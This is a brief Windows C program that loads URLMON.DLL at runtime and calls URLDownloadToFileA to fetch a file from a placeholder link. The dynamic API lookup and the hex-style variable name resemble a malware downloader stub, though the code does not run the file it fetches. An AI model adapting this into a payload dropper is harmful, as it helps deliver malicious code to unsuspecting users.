#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
typedef HRESULT (WINAPI* lpURLDownloadToFile) (LPUNKNOWN t,
    LPCTSTR q,
    LPCTSTR s,
    DWORD x,
    LPBINDSTATUSCALLBACK b);
int main()
{
  lpURLDownloadToFile URLDownloadToFile;
  HMODULE _0x1 = LoadLibrary("URLMON.DLL");
if(_0x1 == NULL)
{
    MessageBox(0,"Failed to load URLMON","Error",MB_OK);
}
    URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(_0x1, "URLDownloadToFileA");
if(URLDownloadToFile == NULL)
{
    MessageBox(0,"Failed","Error",MB_OK);
}
    URLDownloadToFile(0, "LINK TO YOUR FILE", "NAME OF FILE.EXTENSION", 0, 0);
    return 0;
}
